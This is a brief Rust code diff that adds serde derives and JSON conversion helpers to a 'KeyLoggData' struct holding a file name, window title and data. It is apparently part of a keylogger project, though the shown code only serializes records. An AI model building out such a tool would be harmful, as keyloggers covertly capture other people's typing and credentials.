@@ -1,5 +1,7 @@
+use serde::{Deserialize, Serialize};
 use crate::utils::get_current_timestamp;
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct KeyLoggData {
     pub file_name: String,
     pub title: String,
@@ -26,6 +28,12 @@ impl KeyLoggData {
             "title": self.title,
             "data": self.data
         })
+    }
+    pub fn vec_to_json(data: Vec<KeyLoggData>) -> serde_json::Value {
+        data.iter().map(|x| x.to_json()).collect::<Vec<serde_json::Value>>().into()
+    }
+    pub fn from_json_vec(json: &str) -> Vec<KeyLoggData> {
+        serde_json::from_str(json).unwrap()
     }
 }
 
